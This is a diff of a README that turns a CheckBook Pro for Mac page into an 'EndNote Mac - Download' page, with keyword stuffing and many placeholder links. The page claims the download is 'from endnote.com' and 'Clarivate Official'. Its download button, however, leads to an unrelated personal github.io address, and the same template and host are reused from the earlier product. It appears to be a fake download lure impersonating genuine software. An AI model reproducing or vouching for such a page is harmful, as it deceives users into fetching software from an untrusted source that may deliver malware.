@@ -1,36 +1,39 @@
 <p align="center">
-  <img src="https://static.macupdate.com/submission/500255/d/phpekhshn-logo.png" width="150" alt="CheckBook Pro for Mac — checkbook register and personal finance app for macOS"/>
+  <img src="https://cdn.icon-icons.com/icons2/3053/PNG/512/endnote_macos_bigsur_icon_190201.png" width="150" alt="EndNote Mac logo — reference management software for macOS"/>
 </p>
 
-<h1 align="center">CheckBook Pro for Mac</h1>
+<h1 align="center">EndNote Mac - Download</h1>
 
 <p align="center">
-  <a href="#">CheckBook Pro for Mac</a> — the complete guide to getting and using Splasm Software's checkbook
-  register app on your Mac. Learn how to install it, set up your accounts, record and categorize transactions,
-  schedule recurring entries, and understand what reviews say. Simple and elegant, <a href="#">CheckBook
-  Pro</a> makes money tracking easy, and this guide covers the full workflow.
+  <a href="#">EndNote Mac</a> — the leading reference management software for macOS from Clarivate, used by
+  researchers, students, and academics to collect references, organize a research library, and create
+  citations and bibliographies automatically. As <a href="#">EndNote for Mac</a>, it stores your references
+  and PDFs, inserts citations directly into Word with Cite While You Write, and formats bibliographies in
+  thousands of styles. Whether you searched for an <a href="#">EndNote Mac download</a>,
+  <a href="#">EndNote for MacBook</a>, or <a href="#">EndNote in Mac</a>, this is the same essential research
+  tool.
 </p>
 
 <p align="center">
   <img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/>
   &nbsp;
-  <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/>
+  <img src="https://img.shields.io/badge/References-Citations-blue?style=flat-square"/>
   &nbsp;
-  <img src="https://img.shields.io/badge/Register-Balance-blue?style=flat-square"/>
+  <img src="https://img.shields.io/badge/Cite_While-You_Write-orange?style=flat-square"/>
   &nbsp;
-  <img src="https://img.shields.io/badge/Schedule-Report-orange?style=flat-square"/>
+  <img src="https://img.shields.io/badge/Clarivate-Official-red?style=flat-square"/>
 </p>
 
-<p align="center">
-  <a href="https://masdkasas21.github.io/.github/checkbook-pro">
-    <img src="https://user-images.githubusercontent.com/37590873/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png"
-         alt="Download CheckBook Pro for Mac — checkbook register" width="160"/>
-  </a>
-</p>
+---
+
+| [![Download EndNote for Mac](https://user-images.githubusercontent.com/37590873/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png)](https://masdkasas21.github.io/.github/endnote-mac) | **Manage references and cite as you write on your Mac — libraries, PDFs, bibliographies** <br><br> The <a href="#">EndNote Mac download</a> from endnote.com. Build a searchable library of references and PDFs, import citations from databases, insert citations into Word as you write, and generate perfectly formatted bibliographies in thousands of styles — the reference manager trusted across research and academia. |
+|---|---|
+
+---
 
 <p align="center">
-  <img src="https://static.macupdate.com/submission/500255/d/phpvrea6r-screenshot.png"
-       alt="CheckBook Pro for Mac — register with transactions and running balance"
+  <img src="https://libapps-au.s3-ap-southeast-2.amazonaws.com/customers/920/images/EN20_Customizer_Menu.png"
+       alt="EndNote Mac — reference management interface showing library, references, and citation tools"
        width="800"/>
 </p>
 
@@ -38,200 +41,220 @@
 
 ## Table of Contents
 
-- [CheckBook Pro for Mac — Getting Started](#checkbook-pro-for-mac-getting-started)
-- [Installing CheckBook Pro on macOS](#installing-checkbook-pro-on-macos)
-- [Setting Up Your Accounts](#setting-up-your-accounts)
-- [Recording and Categorizing Transactions](#recording-and-categorizing-transactions)
-- [Scheduling Recurring Transactions](#scheduling-recurring-transactions)
-- [What CheckBook Pro Reviews Highlight](#what-checkbook-pro-reviews-highlight)
-- [CheckBook Pro Download and Licensing](#checkbook-pro-download-and-licensing)
-- [Common CheckBook Pro Uses](#common-checkbook-pro-uses)
-- [Tips for Getting the Most From CheckBook Pro](#tips-for-getting-the-most-from-checkbook-pro)
+- [What Is EndNote for Mac](#what-is-endnote-for-mac)
+- [EndNote Mac: Reference Management for Researchers](#endnote-mac-reference-management-for-researchers)
+- [Building Your Reference Library](#building-your-reference-library)
+- [Cite While You Write](#cite-while-you-write)
+- [Citation Styles and Bibliographies](#citation-styles-and-bibliographies)
+- [PDF Management and Organization](#pdf-management-and-organization)
+- [EndNote vs Other Reference Managers](#endnote-vs-other-reference-managers)
+- [Who Uses EndNote](#who-uses-endnote)
 - [Key Terms](#key-terms)
 - [System Requirements](#system-requirements)
 - [Frequently Asked Questions](#frequently-asked-questions)
 - [Keywords](#keywords)
 
-## CheckBook Pro for Mac — Getting Started
+## What Is EndNote for Mac
 
-To get started with <a href="#">CheckBook Pro for Mac</a>, install the app, set up your accounts, and start
-recording transactions in the register. In short: <a href="#">CheckBook Pro</a> gives you a clean, elegant
-electronic checkbook register with scheduling and reports, so tracking your money is simple and quick.
+<a href="#">EndNote Mac</a> is professional reference management software for macOS, developed by Clarivate,
+that helps researchers collect, organize, and cite the sources used in their work. In short:
+<a href="#">EndNote for Mac</a> lets you build a library of references and PDFs, insert citations into your
+documents as you write, and automatically generate formatted bibliographies — removing the tedious, error-
+prone work of managing references by hand.
 
-The value of the <a href="#">CheckBook Pro app</a> is that it makes money tracking easy and pleasant without
-complexity. This guide walks through the <a href="#">CheckBook Pro</a> download, installation, setting up
-accounts, recording transactions, scheduling recurring entries, and what reviews highlight.
+The reason <a href="#">EndNote Mac</a> is a research standard is that managing citations manually is slow and
+mistake-prone, especially for long documents with many sources. <a href="#">EndNote in Mac</a> automates the
+entire process: it keeps all your references in one searchable place, inserts citations correctly as you
+write, and reformats every citation and the bibliography instantly when you change styles. For anyone writing
+papers, theses, or research with citations, an <a href="#">EndNote Mac download</a> saves enormous time.
 
----
+### Why Choose EndNote on the Mac
 
-## Installing CheckBook Pro on macOS
+The appeal of <a href="#">EndNote for Mac</a> comes down to automated, reliable reference management:
 
-A <a href="#">CheckBook Pro</a> download installs like any standard Mac app. You get <a href="#">CheckBook Pro
-for Mac</a> from splasm.com, open the package, and drag it to your Applications folder. A free trial lets you
-evaluate it before buying. On launch, <a href="#">CheckBookPro</a> is ready for you to create your first
-account and begin tracking.
+**Central reference library**: Keep all your references and PDFs organized and searchable in one place.
 
----
+**Cite While You Write**: Insert citations into Word directly as you write, with automatic formatting.
 
-## Setting Up Your Accounts
+**Thousands of styles**: Format citations and bibliographies in thousands of journal and style formats
+instantly.
 
-Setting up accounts is the first step in <a href="#">CheckBook Pro</a>:
-
-1. **Create an account** for your checking, savings, or credit card.
-2. **Set the starting balance** so your register is accurate from the start.
-3. **Add more accounts** if you want to track several together.
-4. **Organize your accounts** for a clear overview.
-5. **Open the register** ready to record your first transactions.
-
-This quick setup gets the <a href="#">CheckBook Pro app</a> ready to track your money.
+**Trusted in research**: A longstanding standard used across academia and research worldwide.
 
 ---
 
-## Recording and Categorizing Transactions
+## EndNote Mac: Reference Management for Researchers
 
-Recording transactions is the heart of <a href="#">CheckBook Pro for Mac</a>:
+At its core, <a href="#">EndNote Mac</a> is built to handle the entire reference workflow:
 
-### Entering Transactions
+### The Research Library
 
-Record transactions quickly into the clean register, and watch your running balance update with each one. This
-makes <a href="#">CheckBook Pro</a> fast and easy for keeping your accounts current.
+<a href="#">EndNote for Mac</a> stores all your references in a searchable library — journal articles, books,
+websites, and more — each with its full bibliographic details and often an attached PDF. This central library
+means every source you have collected is in one place, ready to cite.
 
-### Categorizing Spending
+### Automating Citations
 
-Assign categories to transactions to see where your money goes. Categorization lets <a href="#">CheckBookPro</a>
-show your spending patterns, useful for reports and understanding your finances.
+The power of <a href="#">EndNote in Mac</a> is automation. Rather than typing citations and formatting
+bibliographies by hand, EndNote inserts and formats them for you, and updates everything instantly when you
+change requirements — eliminating a major source of errors and wasted time in academic writing.
 
----
+### Trusted and Comprehensive
 
-## Scheduling Recurring Transactions
-
-Scheduling is a key Pro feature of <a href="#">CheckBook Pro</a>:
-
-### Setting Up Schedules
-
-Set up recurring transactions for regular bills and income, so <a href="#">CheckBook Pro for Mac</a> records
-them automatically on schedule. This saves you from re-entering the same transactions each month.
-
-### Staying Current
-
-Scheduled transactions keep your register up to date with less effort and help you anticipate upcoming
-entries. This convenience is a big reason to choose the Pro version of <a href="#">CheckBook Pro</a>.
+Long established in research, <a href="#">EndNote Mac</a> is a comprehensive, dependable tool that
+researchers and institutions rely on for managing references across projects large and small.
 
 ---
 
-## What CheckBook Pro Reviews Highlight
+## Building Your Reference Library
 
-If you are reading <a href="#">CheckBook Pro for Mac reviews</a>, here is an honest summary of what users tend
-to praise. The standout point is simplicity — reviewers love how easy <a href="#">CheckBook Pro</a> is to use
-compared to complex finance apps, while it still offers scheduling and reports. The clean, elegant interface
-and focus on the checkbook register are commonly appreciated, along with its affordability and the option to
-start simple and upgrade. The fairest way to evaluate the <a href="#">CheckBook Pro app</a> is to try the free
-trial and see whether it fits how you manage money; the strengths above are what most win users over.
+Collecting references is the foundation of <a href="#">EndNote Mac</a>:
 
----
+**Importing from databases**: Import references directly from research databases and library catalogs, so
+adding sources is fast and accurate.
 
-## CheckBook Pro Download and Licensing
+**Online search**: Search databases from within EndNote and add results straight to your library.
 
-Users often look for where to get a <a href="#">CheckBook Pro</a> download. CheckBook Pro is available from
-splasm.com, and a free trial lets you evaluate it before buying. This means you can try <a href="#">CheckBook
-Pro for Mac</a>, set up your accounts, and confirm it fits your needs before purchasing. There is also the
-simpler CheckBook if you want fewer features. For current pricing and the free trial, the official splasm.com
-site is the best source, ensuring a genuine, supported copy of <a href="#">CheckBookPro</a> and access to
-updates.
+**Manual entry**: Add references by hand when needed, with fields for every bibliographic detail.
+
+**Attaching PDFs**: Attach and manage the full-text PDFs of your references, keeping papers and their details
+together in <a href="#">EndNote for MacBook</a>.
 
 ---
 
-## Common CheckBook Pro Uses
+## Cite While You Write
 
-<a href="#">CheckBook Pro</a> fits naturally into everyday money tracking, and seeing common uses shows its
-value:
+The signature feature of <a href="#">EndNote Mac</a> is Cite While You Write:
 
-### Keeping a Simple Checkbook
+### Citations Inside Word
 
-The core use of <a href="#">CheckBook Pro for Mac</a> is exactly what its name suggests: a clean electronic
-checkbook register. Record each transaction, see your running balance, and always know how much you have —
-without the complexity of a full finance suite.
+Cite While You Write integrates <a href="#">EndNote for Mac</a> with Microsoft Word, letting you insert
+citations from your library directly into your document as you write. The citation appears formatted, and
+EndNote builds and updates the bibliography automatically as you add more.
 
-### Managing Recurring Bills and Income
+### Automatic Formatting
 
-Set up scheduled transactions for your regular bills and paychecks so they are recorded automatically. This
-keeps your register current with less effort and helps you plan ahead, one of the most useful features of the
-<a href="#">CheckBook Pro app</a>.
+As you insert citations, <a href="#">EndNote in Mac</a> formats them and the bibliography in your chosen
+style. Add a new citation and the bibliography updates instantly — no manual formatting required. This
+seamless Word integration is the heart of why researchers rely on an <a href="#">EndNote Mac download</a>.
 
-### Tracking Multiple Accounts
+### Effortless Bibliographies
 
-Keep separate registers for checking, savings, and credit cards, all in one place. <a href="#">CheckBook
-Pro</a> lets you manage several accounts simply, so your whole financial picture is easy to see.
-
-### Understanding Your Spending
-
-Categorize transactions and run reports to see where your money goes. Even with its simple approach,
-<a href="#">CheckBookPro</a> gives you real insight into your spending patterns to help you manage better.
+Because citations and the bibliography are generated automatically, producing a correctly formatted reference
+list is effortless with <a href="#">EndNote Mac</a>, even for documents with hundreds of sources.
 
 ---
 
-## Tips for Getting the Most From CheckBook Pro
+## Citation Styles and Bibliographies
 
-A few habits improve your use of <a href="#">CheckBook Pro</a>:
+Style flexibility is a defining strength of <a href="#">EndNote Mac</a>:
 
-**Set accurate starting balances** so your register is correct from the start.
+<a href="#">EndNote for Mac</a> includes thousands of citation styles covering the requirements of journals,
+universities, and disciplines worldwide. When a journal requires a specific style, you select it and EndNote
+reformats every citation and the entire bibliography instantly to match. If you need to submit the same paper
+to a different journal with different requirements, changing the style takes seconds rather than hours of
+manual reformatting. This instant restyling is one of the biggest time-savers in <a href="#">EndNote in
+Mac</a>, making it indispensable for researchers who publish.
 
-**Record transactions promptly** to keep your running balance current.
+---
 
-**Schedule recurring bills and income** to save time and stay up to date.
+## PDF Management and Organization
 
-**Reconcile regularly** against your statements to keep records accurate.
+Beyond citations, <a href="#">EndNote Mac</a> manages your research papers:
+
+**PDF library**: Store and organize the full-text PDFs of your references alongside their details.
+
+**Reading and annotation**: Read and annotate PDFs within EndNote, keeping your notes with the sources.
+
+**Groups**: Organize references into groups by project, topic, or paper, so relevant sources are easy to find.
+
+**Search**: Search your entire library — including PDF contents — to locate any reference quickly in
+<a href="#">EndNote for MacBook Air</a> and other Macs.
+
+---
+
+## EndNote vs Other Reference Managers
+
+<a href="#">EndNote Mac</a> is a leading choice among reference managers. Key comparisons:
+
+| Capability | EndNote | Basic Reference Tools |
+|---|---|---|
+| Cite While You Write in Word | Yes, robust | Varies |
+| Citation styles | Thousands | Fewer |
+| PDF management | Yes, full | Varies |
+| Handling large libraries | Yes | Struggles |
+| Institutional standard | Widely | Sometimes |
+
+For serious research and publishing, <a href="#">EndNote for Mac</a> offers depth, style coverage, and Word
+integration that make it a professional standard.
+
+---
+
+## Who Uses EndNote
+
+<a href="#">EndNote Mac</a> serves the research community:
+
+**Researchers** managing references and citations across many papers and projects.
+
+**Graduate students** writing theses and dissertations with extensive bibliographies.
+
+**Academics** publishing in journals with specific citation requirements.
+
+**Anyone writing with citations** who wants to automate reference management.
 
 ---
 
 ## Key Terms
 
-**Register** — the running list of transactions with a balance.
+**Reference** — a stored source (article, book, etc.) with its bibliographic details.
 
-**Running balance** — your current balance, updated with each transaction.
+**Library** — EndNote's searchable collection of all your references and PDFs.
 
-**Scheduled transaction** — a recurring entry recorded automatically.
+**Cite While You Write** — inserting and formatting citations in Word automatically.
 
-**Reconciliation** — matching your records against a bank statement.
+**Citation style** — the format rules for citations and bibliographies, such as APA or MLA.
 
-**Category** — a classification for transactions to understand spending.
+**Bibliography** — the formatted list of references cited in a document.
 
-**Report** — a summary of your transactions and spending.
+**Group** — a way to organize references by project, topic, or paper.
 
 ---
 
 ## System Requirements
 
-| Specification | Requirement |
+| Requirement | Specification |
 |---|---|
-| macOS | Recent macOS version (see splasm.com) |
+| macOS | Recent macOS version (see endnote.com) |
 | Architecture | Apple Silicon and Intel |
-| Use | Checkbook register and personal finance tracking |
-| License | Purchase from splasm.com — free trial |
+| Integration | Works with Microsoft Word (Cite While You Write) |
+| License | Purchase from endnote.com — often available through institutions |
 
 ---
 
 ## Frequently Asked Questions
 
-**Where do I get the CheckBook Pro download?**
-Get the <a href="#">CheckBook Pro</a> download from splasm.com; a free trial lets you evaluate it first.
+**What is EndNote for Mac?**
+<a href="#">EndNote Mac</a> is reference management software for macOS that stores references and PDFs,
+inserts citations into Word, and generates formatted bibliographies automatically.
 
-**How do I set up an account?**
-In <a href="#">CheckBook Pro for Mac</a>, create an account, set its starting balance, and open the register to
-record transactions.
+**Does EndNote work with Word on Mac?**
+Yes. <a href="#">EndNote for Mac</a> integrates with Microsoft Word through Cite While You Write to insert and
+format citations as you write.
 
-**Does CheckBook Pro handle recurring transactions?**
-Yes. <a href="#">CheckBook Pro</a> supports scheduled transactions for recurring bills and income.
+**Can EndNote manage PDFs?**
+Yes. <a href="#">EndNote in Mac</a> stores, organizes, reads, and annotates the full-text PDFs of your
+references.
 
-**What do CheckBook Pro reviews say?**
-For fair <a href="#">CheckBook Pro for Mac reviews</a>, users most praise its simplicity and elegant register;
-try the free trial to judge.
+**How many citation styles does EndNote have?**
+<a href="#">EndNote for MacBook</a> includes thousands of citation styles, and switching between them
+reformats your document instantly.
 
-**Is there a simpler version?**
-Yes. Splasm also offers the simpler CheckBook; <a href="#">CheckBookPro</a> adds scheduling and reports.
+**Where do I get an EndNote Mac download?**
+Get the <a href="#">EndNote Mac download</a> from endnote.com; it is also often available through
+universities and institutions.
 
 ---
 
 ## Keywords
 
-checkbook pro, checkbook pro for mac, checkbookpro, checkbook pro app, checkbook pro for mac reviews
+endnote mac, endnote mac download, end note mac, endnote for macbook, endnote for macbook air, endnote in mac, endnote mac os
